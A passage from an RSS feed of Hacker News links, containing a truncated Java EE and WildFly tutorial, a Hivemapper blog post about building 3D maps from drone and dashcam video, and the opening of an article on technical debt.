banks, insurance companies, government agencies, S&amp;P500, AEX, etc.</p>
<p>After a general introduction, as well as an overview of the framework's terminology,
we'll be setting up a Java EE project from scratch,
the full source code of which can be found on <a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.
Also, check the README file there for a TL;DR version of this article.</p>
<a href="#table-of-contents"></a>
<ul>
<li><a href="#java-ee-theory">Java EE Theory</a><ul>
<li><a href="#specifications-and-apis">Specifications and APIs</a></li>
<li><a href="#application-servers-and-implementations">Application Servers and Implementations</a></li>
<li><a href="#jboss-wildfly">JBoss WildFly</a></li>
</ul>
</li>
<li><a href="#project-overview">Project Overview</a></li>
<li><a href="#wildfly-setup">WildFly Setup</a></li>
<li><a href="#hello-world">Hello World</a><ul>
<li><a href="#command-line-deployment">Command Line Deployment</a></li>
<li><a href="#intellij-deployment">IntelliJ Deployment</a></li>
</ul>
</li>
<li><a href="#deployment-artifacts-jar-war-ear">Deployment Artifacts (.jar, .war, .ear)</a></li>
<li><a href="#rest-endpoints-jax-rs">REST Endpoints (JAX-RS)</a><ul>
<li><a href="#json-binding">JSON Binding</a></li>
<li><a href="#bean-validation">Bean Validation</a></li>
</ul>
</li>
<li><a href="#beans-scopes-and-injection">Beans, Scopes and Injection</a><ul>
<li><a href="#beans-and-scopes">Beans and Scopes</a></li>
<li><a href="#cdi">CDI</a></li>
<li><a href="#ejbs">EJBs</a></li>
<li><a href="#containers">Containers</a></li>
</ul>
</li>
<li><a href="#database-connectivity">Database Connectivity</a><ul>
<li><a href="#local-postgresql-setup-via-docker">Local PostgreSQL Setup via Docker</a></li>
<li><a href="#registering-postgresql-as-a-data-source">Registering PostgreSQL as a Data Source</a></li>
<li><a href="#persistence-and-entities-jpa">Persistence and Entities (JPA)</a></li>
<li><a href="#flyway-database-migrations">Flyway Database Migrations</a></li>
</ul>
</li>
<li><a href="#container-transaction-management">Container Transaction Management</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
<a href="#java-ee-theory"></a>
<p>Java EE is a Java framework for developing server-side applications.
Among other things, it allows you to:</p>
<ul>
<li>create web APIs by accepting incoming HTTP requests</li>
<li>save and retrieve data from databases</li>
<li>send and receive messages from message brokers</li>
<li>connect to other backend systems via HTTP or SOAP</li>
<li>package applications into single units of deployment (.war files)</li>
</ul>
<p>The framework is very much geared towards enterprises and big corporations.
As such, it often ends up being popular in the domains of banking, insurance, accounting, finance, and manufacturing.</p>
<p>Like the programming language Java itself, Java EE used to be owned and managed by
<a href="https://en.wikipedia.org/wiki/Oracle_Corporation">Oracle</a>.
However, between 2017 and 2019, Oracle has transfered the ownership of the Java EE framework to the
<a href="https://en.wikipedia.org/wiki/Eclipse_Foundation">Eclipse Foundation</a>,
resulting in the framework being renamed <em>Jakarta EE</em> from version 8-9 onward.</p>
<div><table>
<thead>
<tr>
<th>Framework Name</th>
<th>Version</th>
<th>Year of Release</th>
</tr>
</thead>
<tbody><tr>
<td>J2EE</td>
<td>1.2</td>
<td>1999</td>
</tr>
<tr>
<td>J2EE</td>
<td>1.3</td>
<td>2001</td>
</tr>
<tr>
<td>J2EE</td>
<td>1.4</td>
<td>2003</td>
</tr>
<tr>
<td>Java EE</td>
<td>5</td>
<td>2006</td>
</tr>
<tr>
<td>Java EE</td>
<td>6</td>
<td>2009</td>
</tr>
<tr>
<td>Java EE</td>
<td>7</td>
<td>2013</td>
</tr>
<tr>
<td>Java EE</td>
<td>8</td>
<td>2017</td>
</tr>
<tr>
<td>Jakarta EE</td>
<td>8</td>
<td>2019</td>
</tr>
<tr>
<td>Jakarta EE</td>
<td>9</td>
<td>2020</td>
</tr>
</tbody></table></div>
<p>It's going to take time for the term Jakarta EE to really catch on,
as the term Java EE is still very much ingrained in the corporate software industry.</p>
<p>We will be setting up a <strong>Java EE 8</strong> application in the build-along section of this article.</p>
<a href="#specifications-and-apis"><h2 id="specifications-and-apis">Specifications and APIs</h2></a>
<p>You should think of Java EE as a collection of <em>recipes</em>.
Recipes for typical pieces of functionality within a server application.
The technical term for a Java EE recipe is a <em>Java Specification Request</em> (JSR),
and each JSR describes a single unit of functionality within the Java EE framework.
For example:</p>
<ul>
<li>Creating a RESTful web API? <strong>JSR 370</strong></li>
<li>Validating incoming HTTP request bodies? <strong>JSR 380</strong></li>
<li>Connecting and reading (or writing) from a database? <strong>JSR 338</strong></li>
<li>Publishing messages to a message broker? <strong>JSR 343</strong></li>
</ul>
<p>This modular setup lets developers pick and choose which parts of the framework they want to use.</p>
<p>In an actual project, this typically means that your application has a single Maven dependency on the
<a href="https://mvnrepository.com/artifact/javax/javaee-api">full Java EE API</a>.</p>
<p>And what's interesting to understand, is that these Java EE API modules consist of nothing but interfaces, annotations and simple POJOs.
<em>There is no actual Java EE framework functionality in <strong>any</strong> of these API modules.</em>
The <em>real</em> implementation of the Java EE specifications, interfaces and annotations lies with the host environment
in which your Java application(s) will be running.
And such host environments are referred to as <strong>Java EE application servers</strong>, or simply <strong>(application) servers</strong>.</p>
<a href="#application-servers-and-implementations"><h2 id="application-servers-and-implementations">Application Servers and Implementations</h2></a>
<p>Java EE applications can't stand on their own—they require a <em>Java EE application server</em> to run in,
because the server provides the application with the facilities it needs to carry out its tasks.</p>
<p>This ties back to the story about JSRs (Java Specification Requests) from earlier.
Since your application only depends on Java EE <strong>API</strong> modules,
it's agnostic of the actual implementation of these modules (at least in theory 😅).
It's up to the application server to provide the actual (runtime) <strong>implementations</strong> to these API modules.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/application-server.svg" alt="application server diagram with multiple deployments and multiple runtime implementation JAR files"></p>
<p>The image above should make clear that Java EE application servers are to be thought of as facilitating environments,
in which multiple (unrelated) Java apps from different teams or departments
can simaltuneously run alongside each other, each application pseudo-isolated from its neighbours.</p>
<p>An application server doesn't have to implement every single Java EE specification, though.
Different servers can have varying degrees of specification <em>compliance</em>.</p>
<p>For example, the <a href="http://tomcat.apache.org/">Apache Tomcat</a> server only implements the web layer of the
Java EE specification and, as such, is referred to as a <strong>web server</strong>.
The <a href="https://www.wildfly.org/">JBoss WildFly</a> server, on the other hand,
implements every part of the Java EE specification, and can therefore be referred to as a <strong>(Full) Java EE application server</strong>.</p>
<p>Below's an overview of the most popular Java EE servers.</p>

<p>When deploying a Java EE application to some server, there will be lots of additional libraries available on the classpath at runtime.
These are all <em>implementation libraries</em> for the different Java EE API modules which the application might depend on.
So there's a big difference between <em>compile-time</em> API libraries and <em>runtime</em> implementation libraries.</p>
<hr>
<p>For example, by having a Maven <em>compile</em> dependency on the (full) <a href="https://mvnrepository.com/artifact/javax/javaee-api">Java EE API</a> library,
you'll be able to decorate your classes and methods with the <code>@Path</code> and <code>@GET</code> annotations (part of JSR 370)
and create a simple HTTP endpoint like this:</p>
<pre><code><span>@Path</span><span>(</span><span>"/ping"</span><span>)</span>
<span>public</span> <span>class</span> <span>PingResource</span> <span>{</span>

    <span>@GET</span>
    <span>public</span> <span>Response</span> <span>ping</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>Response</span><span>.</span><span>ok</span><span>(</span><span>"Ping"</span><span>)</span><span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

<span>}</span></code></pre>
<p>In and of themselves, Java runtime annotations don't do anything.
That's why the application server has an <em>implementation library</em> for JSR 370, which it places on the classpath during runtime.
This implementation would then have a built-in mechanism which scans your application for all classes with the <code>@Path</code> annotation,
and register them as HTTP endpoints.</p>
<hr>
<p>Server developers typically choose to implement most of the <a href="https://jcp.org/en/jsr/all">500+</a> JSRs themselves.
Often, these implementation are then packaged into standalone libraries so that, in theory,
they can be re-used by other server developers.</p>
<p>As such, there are typically only 1 or 2 popular implementation libraries for each specification,
which may or may not find their way into the standard configuration of multiple different application servers over time.</p>

<a href="#jboss-wildfly"><h2 id="jboss-wildfly">JBoss WildFly</h2></a>
<p>JBoss used to be the name of a company which has developed one of the most popular Java EE application servers in the world:
<a href="https://www.redhat.com/en/technologies/jboss-middleware/application-platform">JBoss EAP</a> (Enterprise Application Platform).
The other application server which JBoss is known for, is called <a href="https://www.wildfly.org/">WildFly</a>.
The difference? Technically, nothing.
WildFly is the free community edition
and JBoss EAP is the paid enterprise edition (with official support)
of the <em>same</em> application server.</p>
<p>As a sidenote, JBoss actually got acquired by <a href="https://www.redhat.com/">RedHat</a> in 2006.
And then, in 2019, RedHat got acquired by <a href="https://www.ibm.com/">IBM</a>.
So the JBoss EAP / WildFly server is technically part of IBM's portfolio now,
together with IBM's self-developed Java EE application server called <a href="https://www.ibm.com/cloud/websphere-application-platform/">WebSphere</a>.</p>
<p>We'll be working with the <strong>JBoss WildFly</strong> application server (version <strong>20</strong>) in the build-along section of this article.</p>
<a href="#project-overview"></a>
<p>We'll be working on a Java EE application with the following features:</p>
<ul>
<li>customers can sign up via the <code>POST /accounts</code> endpoint<ul>
<li>their <code>name</code> and <code>email</code> are saved into the database</li>
<li>they're sent a welcome e-mail</li>
</ul>
</li>
<li>all accounts can be queried via the <code>GET /accounts</code> endpoint</li>
<li>a single account can be queried via the <code>GET /accounts/{id}</code> endpoint</li>
</ul>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/project-overview.svg" alt="diagram containing the basic 3-tiered architecture: resource, service and repository"></p>
<p>You can find the full source code of the final application on
<a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.
If you would like to follow along, please make sure to have the following tools installed:</p>
<ul>
<li><strong>Java 11</strong> - newer language versions aren't supported by the WildFly version we're going to pick later</li>
<li><strong>Maven</strong></li>
<li><strong>Docker Compose</strong> - for running the database locally</li>
<li><strong>IntelliJ</strong></li>
</ul>
<a href="#wildfly-setup"></a>
<p>Start out by downloading the <strong>JBoss WildFly 20.0.0.Final</strong> application server (Java EE Full &amp; Web Distribution)
from the official <a href="https://www.wildfly.org/downloads/">downloads page</a>.
Once it's downloaded, unzip the the archive to a convenient location or simply leave it
inside your <code>~/Downloads/</code> folder (which is what I will do).</p>
<p>I shall refer to the WildFly root directory as <code>$JBOSS_HOME</code> from now on,
which would resolve to <code>~/Downloads/wildfly-20.0.0.Final/</code> on my system.</p>
<p>To <em>start</em> this server, simply <code>cd</code> into the <code>$JBOSS_HOME/bin/</code> folder and run the <code>./standalone.sh</code> script.
After a few seconds, you should be able to visit <a href="http://localhost:8080/">localhost:8080</a>
and be greeted with the following welcome screen.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/wildfly-welcome-screen.png" alt="WildFly welcome screen"></p>
<p>(To stop the server,
simply press Cmd + C or Ctrl + C from the terminal window where the <code>./standalone.sh</code> script is running.)</p>
<p>WildFly also comes with a useful management dashboard, available at <a href="http://localhost:9990/">localhost:9990</a>,
from where we'll be able to view runtime stats about WildFly itself and all Java EE applications deployed to it.
In order to access the dashboard, we'll have to create a management user first, though.
To do so, <code>cd</code> into <code>$JBOSS_HOME/bin/</code> and run the <code>./add-user.sh</code> script.</p>
<pre><code>&gt;…</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jessym.com/articles/a-complete-introduction-to-java-ee">https://www.jessym.com/articles/a-complete-introduction-to-java-ee</a></em></p>]]>
            </description>
            <link>https://www.jessym.com/articles/a-complete-introduction-to-java-ee</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871754</guid>
            <pubDate>Fri, 23 Oct 2020 17:22:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We are scaling a 3D map of the world with drones and dashcams]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24871396">thread link</a>) | @rels25
<br/>
October 23, 2020 | https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687 | <a href="https://web.archive.org/web/*/https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7170/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg" width="3585" height="1215" srcset="https://miro.medium.com/max/552/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 276w, https://miro.medium.com/max/1104/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 552w, https://miro.medium.com/max/1280/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 640w, https://miro.medium.com/max/1456/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 728w, https://miro.medium.com/max/1632/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 816w, https://miro.medium.com/max/1808/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 904w, https://miro.medium.com/max/1984/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 992w, https://miro.medium.com/max/2160/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1080w, https://miro.medium.com/max/2700/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1350w, https://miro.medium.com/max/3240/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1620w, https://miro.medium.com/max/3780/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1890w, https://miro.medium.com/max/4320/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 2160w, https://miro.medium.com/max/4800/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg?q=20"></p></div></div></figure></div><div><div><div><div><div><div><p><a href="https://medium.com/@Hivemapper?source=post_page-----a624a09d687--------------------------------" rel="noopener"><img alt="Hivemapper" src="https://miro.medium.com/fit/c/96/96/1*PrxMVjinBagmTWTc1AjTyw.png" width="48" height="48"></a></p></div></div></div></div><p id="0785">Maps are one of the oldest types of technology in the world. We take them for granted and yet they’re critical and everywhere. But maps cost billions to produce and therefore don’t get updated frequently enough for businesses and machines that require up-to-date data.</p><p id="a0c7">To create a fresh and intelligent 3D map of the world, <a href="http://hivemapper.com/" rel="noopener">Hivemapper</a> combines a new software approach to making maps, with a <a href="https://hivemapper.com/collectors" rel="noopener">mapping network</a> of commodity drones and <a href="https://hivemapper.com/open-dash" rel="noopener">dashcam</a> to grow and update the map. The global 3D map we are building is scaling and updating four times faster, and at a fraction of the cost, of traditional mapping companies.</p><p id="2123">By comparison, where Google Maps deploys a small number of highly specialized cars driving around the world, we engage with an unlimited number of contributors who only need a dashcam or off-the-shelf drone to participate. Here’s a quick peek:</p></div></div><div><div><p id="255d">Since February 2020, collectors in the Hivemapper mapping network have been rapidly adding to and growing the global map:</p><ul><li id="8835"><strong>9,000 sq km </strong>— in more than 80 countries — have been mapped</li><li id="7fa3"><strong>50% monthly growth</strong> of the global map</li><li id="248f">In just one week, areas of the map have grown from <strong>1 to 90 sq. km</strong> — about three Manhattans</li></ul><p id="214d">Hivemapper regards a decentralized mapping network as critical mapping infrastructure necessary to democratize mapping, make mapping a utility like storage and bandwidth, and fuel the business use-cases and autonomous machines that require up-to-date 3D maps.</p><p id="5fbc">In a static world — no new roads, no closures, no natural disasters, no new development existing approaches to building and updating 2D and 3D maps are satisfactory. Yet, the physical world is changing faster than ever. Urbanization, climate change, autonomous transportation, and now pandemics are driving 15% of the global road network to change annually.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*bvdIk7dlMi1TC6r_baxykg.png" width="2280" height="1288" srcset="https://miro.medium.com/max/552/1*bvdIk7dlMi1TC6r_baxykg.png 276w, https://miro.medium.com/max/1104/1*bvdIk7dlMi1TC6r_baxykg.png 552w, https://miro.medium.com/max/1280/1*bvdIk7dlMi1TC6r_baxykg.png 640w, https://miro.medium.com/max/1400/1*bvdIk7dlMi1TC6r_baxykg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*bvdIk7dlMi1TC6r_baxykg.png?q=20"></p></div></div></div><figcaption>The world is changes faster, and today’s maps cannot keep up</figcaption></figure><p id="49e3">Today, Big Tech mapping companies spend billions of dollars to deploy fleets of highly specialized vehicles, fly airplanes equipped with advanced camera systems, and even launch satellites. Given the enormous expense, maps are rarely updated and companies apply expensive and restrictive licensing agreements to their use. For businesses that rely on maps for mission critical monitoring and navigation an out-of-date map is a serious issue:</p><ul><li id="f163">Google Maps was not updated for 12 months after the devastating fires in Santa Rosa (California) destroyed homes and infrastructure.</li><li id="89a6">Because Google and others are too slow to update, a delivery company operating in the Detroit area had to collect their own data for maps using multiple tools.</li><li id="750d">Each year 20% of structures in Dallas change; a delivery company hires teams of people to manually update these to reduce costly rejected deliveries.</li></ul><p id="2b88">However important maps already are, updated 3D maps are a mission critical piece of infrastructure for the navigation systems of autonomous vehicles. Feeding an out-of-date map to an autonomous vehicle is potentially catastrophic. The lack of large scale affordable and accurate 3D maps remain a key obstacle preventing the autonomous transportation promise from becoming an everyday reality.</p><p id="673f">We believe there are three pillars required to build and deliver a decentralized mapping network capable of turning 3D maps into an affordable and accessible utility for businesses and machines that require up-to-date maps.</p><p id="b314">When anyone with a commodity dashcam or drone can collect and contribute video it shifts the challenge from a costly logistics and hardware problem into a challenging software opportunity.</p><p id="1ba7">The <a rel="noopener" href="https://blog.hivemapper.com/engineering-a-living-map-introduction-4d4b3e5f28e8">technical breakthrough</a> of Hivemapper is that, leveraging modern compute power we can take nearly any source video of the physical world and convert it into an accurate 3D map. Additionally, the Hivemapper technology does not require all of the video to be produced by one source in a highly structured and organized way. Instead, Hivemapper receives, processes and transforms disparate videos into an accurate and intelligent 3D map.</p><p id="22f6">Think of the Hivemapper map as a puzzle where each video uploaded to Hivemapper forms one piece. The puzzle is only complete when each piece is in its proper place and Hivemapper makes all of the individual pieces come together. This core technology enables a decentralized network of contributors.</p><p id="e3d4">Our approach combining commodity video collections tools from different collectors with our mapping software produced this 50 sq km map around <a href="https://hivemapper.com/map?content=terrain&amp;content=context&amp;content=hmmap&amp;content-filters=color,highacc&amp;overlays=osm-planet&amp;view=-2698768.77,-4293712.18,3856567.37,-2.296,-0.709" rel="noopener">Stanford University</a>:</p></div></div><div><div><div><figure><div></div><figcaption>50 sq km of Silicon Valley built by dashcam and drones</figcaption></figure></div></div></div><div><div><p id="abad">How we built this map</p><ul><li id="9681">5 different video collectors, separately and on different days, collected video and uploaded to Hivemapper.com</li><li id="a577">The collectors used 3 different brands and types of commodity drones and dashcam: DJI, Autel, and Blackvue</li></ul><h2 id="8876"><strong><em>Cost effective</em></strong></h2><p id="23eb">Transforming the collected video into a 3D map is compute intensive. Over the last few years, we have devised novel ways to reduce the compute cost of creating the map enabling us to scale economically. Just in the last few months we have reduced the cost to compute by an additional 60% — a cost that will come down materially with additional scale.</p><p id="bf41">Because Hivemapper is designed to work in the cloud and at the edge from inception. Everything on <a href="http://hivemapper.com/map" rel="noopener">Hivemapper.com</a> can be deployed on a high-end gaming PC. When maps are produced on-premise, we spread the compute costs across many thousands of devices that are otherwise sitting idle.</p><p id="73d8">Our platform allows us to move more of the processing to the edge. All maps produced at the edge can be merged into the global 3D map hosted at <a href="http://hivemapper.com/" rel="noopener">hivemapper.com</a>. In 2021, we will take another big leap in reducing compute costs. Stay tuned.</p><p id="8aa6">The Hivemapper map is built from video collected by commodity drones, empowering virtually anyone to become a collector and earn additional income. Our approach provides an affordable, accessible alternative to the expensive and specialized mapping vehicles and satellites.</p><p id="673a">Earlier approaches to crowdsourced mapping required learning complex GIS interfaces involving tedious amounts of tracing lines across stale satellite imagery. Collecting video for the Hivemapper map can be done, simply, by anyone with a drone or dashcam.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*zhFzxKRcknjxZkvYcIxjAg.png" width="2280" height="1284" srcset="https://miro.medium.com/max/552/1*zhFzxKRcknjxZkvYcIxjAg.png 276w, https://miro.medium.com/max/1104/1*zhFzxKRcknjxZkvYcIxjAg.png 552w, https://miro.medium.com/max/1280/1*zhFzxKRcknjxZkvYcIxjAg.png 640w, https://miro.medium.com/max/1456/1*zhFzxKRcknjxZkvYcIxjAg.png 728w, https://miro.medium.com/max/1632/1*zhFzxKRcknjxZkvYcIxjAg.png 816w, https://miro.medium.com/max/1808/1*zhFzxKRcknjxZkvYcIxjAg.png 904w, https://miro.medium.com/max/1984/1*zhFzxKRcknjxZkvYcIxjAg.png 992w, https://miro.medium.com/max/2000/1*zhFzxKRcknjxZkvYcIxjAg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*zhFzxKRcknjxZkvYcIxjAg.png?q=20"></p></div></div></div><figcaption>Hivemapper mapping network</figcaption></figure></div></div></div><div><div><p id="868d">Drone pilots are growing the Hivemapper map from the air with $1,000 drones that have meaningful advantages compared over multi-million dollar satellites. Drones fly a few hundred feet above ground level producing a higher resolution map. Unlike a satellite, drone can easily fly below clouds, fog, and smoke as needed, and can see areas that satellites cannot see.</p><p id="f3ce">In 2021, to move even closer to the action at the street-level we will add dashcams as a new mode of video collection. The <a href="https://hivemapper.com/open-dash" rel="noopener">Open Dashcam</a> will make collecting video for the global map a part of the everyday drive.</p><p id="02ad">This launch represents a significant milestone towards building the first decentralized 3D mapping network for affordable, up-to-date, and accurate 3D maps.</p><h2 id="69b2">Hivemapper Studio is like Pokemon Go for drone pilots</h2><p id="c98a"><a href="http://studio.hivemapper.com/" rel="noopener">Hivemapper Studio</a> is the tool drone pilots use to connect their commodity drones to our mapping network.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3816/1*2TxRC754B7JU1sS6RBA1Eg.png" width="1908" height="850" srcset="https://miro.medium.com/max/552/1*2TxRC754B7JU1sS6RBA1Eg.png 276w, https://miro.medium.com/max/1104/1*2TxRC754B7JU1sS6RBA1Eg.png 552w, https://miro.medium.com/max/1280/1*2TxRC754B7JU1sS6RBA1Eg.png 640w, https://miro.medium.com/max/1456/1*2TxRC754B7JU1sS6RBA1Eg.png 728w, https://miro.medium.com/max/1632/1*2TxRC754B7JU1sS6RBA1Eg.png 816w, https://miro.medium.com/max/1808/1*2TxRC754B7JU1sS6RBA1Eg.png 904w, https://miro.medium.com/max/1984/1*2TxRC754B7JU1sS6RBA1Eg.png 992w, https://miro.medium.com/max/2000/1*2TxRC754B7JU1sS6RBA1Eg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*2TxRC754B7JU1sS6RBA1Eg.png?q=20"></p></div></div></div><figcaption>Hivemapper Studio — connect your drone to our mapping network</figcaption></figure></div></div></div><div><div><p id="2896">Studio breaks the world up into hexagon shaped tiles — 0.1 sq km per tile. Collectors can map 1 tile or 100,000 tiles providing total flexibility. <a rel="noopener" href="https://blog.hivemapper.com/hivemapper-studio-a-better-way-to-fly-841a2c330756">Studio</a> generates automated flight paths for the drone to map your selected tiles. These flight paths ensures contiguous coverage, high quality data, and a simplified collection process for drone pilots.</p><p id="392a">After uploading video for the tile, the collector earns a financial reward and their username is displayed on the tile — marking ownership of the map. The thrill of watching your creation grow with each tile you map is not easily understood until you enjoy it yourself.</p><p id="1e70">One of our early collectors, <a href="https://medium.com/@Hivemapper/building-a-better-map-together-af72b3699918" rel="noopener"><em>MrDundee</em></a><em>,</em> who has mapped over 1,000 tiles in Australia explained it best: “Hivemapper Studio is Pokemon Go for Pilots.” Perfect.</p><h2 id="dae6">Map the world while you drive</h2><p id="8db9">The launch of our <a href="https://hivemapper.com/open-dash" rel="noopener">Open Dashcam</a> in 2021 will use commodity hardware with publicly available specs, introducing a passive mode of collecting, and mapping the world while driving.</p></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7170/1*y7MuGKI7do-KQQEKYfrMfg.jpeg" width="3585" height="1215" srcset="https://miro.medium.com/max/552/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 276w, https://miro.medium.com/max/1104/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 552w, https://miro.medium.com/max/1280/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 640w, https://miro.medium.com/max/1456/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 728w, https://miro.medium.com/max/1632/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 816w, https://miro.medium.com/max/1808/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 904w, https://miro.medium.com/max/1984/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 992w, https://miro.medium.com/max/2160/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1080w, https://miro.medium.com/max/2700/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1350w, https://miro.medium.com/max/3240/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1620w, https://miro.medium.com/max/3780/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1890w, https://miro.medium.com/max/4320/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 2160w, https://miro.medium.com/max/4800/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*y7MuGKI7do-KQQEKYfrMfg.jpeg?q=20"></p></div></div><figcaption>Street-level maps, produced with Open Dashcam</figcaption></figure></div><div><div><p id="e4e6">When the dashcam connects to Wifi, collected data is uploaded automatically, moving data from your car to the map. Open Dashcam will be both affordable and easy to install on any vehicle. While we will sell the Open Dashcam via Hivemapper.com, we welcome other developers and partners to build Hivemapper compatible dashcams to help expand this global mapping community.</p><p id="7be3">Pricing will be available for the Open Dashcam soon —<a href="https://hivemapper.com/open-dash" rel="noopener"> join the waitlist</a> and get updated about details.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3800/1*1bYxlxIZMDpYqGQpkOwKLw.png" width="1900" height="866" srcset="https://miro.medium.com/max/552/1*1bYxlxIZMDpYqGQpkOwKLw.png 276w, https://miro.medium.com/max/1104/1*1bYxlxIZMDpYqGQpkOwKLw.png 552w, https://miro.medium.com/max/1280/1*1bYxlxIZMDpYqGQpkOwKLw.png 640w, https://miro.medium.com/max/1400/1*1bYxlxIZMDpYqGQpkOwKLw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*1bYxlxIZMDpYqGQpkOwKLw.png?q=20"></p></div></div></div><figcaption>Street-level maps, produced with Open Dashcam</figcaption></figure><p id="73ec">What’s in it for collectors to build and update the map for customers? Financial rewards (and fun). Clear financial incentives ensure that the map is predictable and reliable for enterprise customers. Unlike older approaches, we believe users who help create the product by infusing it with data should be remunerated for their efforts.</p><p id="15e5">Each tile on the map has a price. A user can map one tile and earn a little, or map a few thousand and earn far more. Maps for some areas are more valuable than others, reflected in the price of each tile.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3760/1*ZV67pHi0Dc2NwTRPjmfeEA.png" width="1880" height="1064" srcset="https://miro.medium.com/max/552/1*ZV67pHi0Dc2NwTRPjmfeEA.png 276w, https://miro.medium.com/max/1104/1*ZV67pHi0Dc2NwTRPjmfeEA.png 552w, https://miro.medium.com/max/1280/1*ZV67pHi0Dc2NwTRPjmfeEA.png 640w, https://miro.medium.com/max/1456/1*ZV67pHi0Dc2NwTRPjmfeEA.png 728w, https://miro.medium.com/max/1632/1*ZV67pHi0Dc2NwTRPjmfeEA.png 816w, https://miro.medium.com/max/1808/1*ZV67pHi0Dc2NwTRPjmfeEA.png 904w, https://miro.medium.com/max/1984/1*ZV67pHi0Dc2NwTRPjmfeEA.png 992w, https://miro.medium.com/max/2000/1*ZV67pHi0Dc2NwTRPjmfeEA.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*ZV67pHi0Dc2NwTRPjmfeEA.png?q=20"></p></div></div></div></figure></div></div></div><div><div><p id="042e">Just as the physical world changes, so does the price to a map tile. Events like hurricanes, fires, and construction dynamically affect the price of tiles. When hurricanes are anticipated, insurance companies and first responders need to have an updated map such that once the hurricane passes, damages can be assessed quickly and accurately before and after the hurricane hits.</p><h2 id="b929">Get 1,000 tiles mapped for free</h2><p id="1a17">Mapping begets mapping. Hivemapper is accepting applications from businesses, governments, and organizations of all kinds looking to build a fresh new map of an area. We will pay collectors to map 1,000 tiles anywhere in the world. Learn more <a rel="noopener" href="https://blog.hivemapper.com/winners-choice-call-for-map-wish-lists-39e8e65a497e">here</a>.</p><p id="91de">As the mapping network continues to expand coverage, map data is becoming a digital utility like storage or compute. Just as storage and compute can be …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687">https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687</a></em></p>]]>
            </description>
            <link>https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871396</guid>
            <pubDate>Fri, 23 Oct 2020 16:48:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Technical Debt: Why it'll ruin your software]]>
            </title>
            <description>
<![CDATA[
Score 186 | Comments 136 (<a href="https://news.ycombinator.com/item?id=24871348">thread link</a>) | @yannikyeo
<br/>
October 23, 2020 | https://labcodes.com.br/blog/articles/tech-debt.html | <a href="https://web.archive.org/web/*/https://labcodes.com.br/blog/articles/tech-debt.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
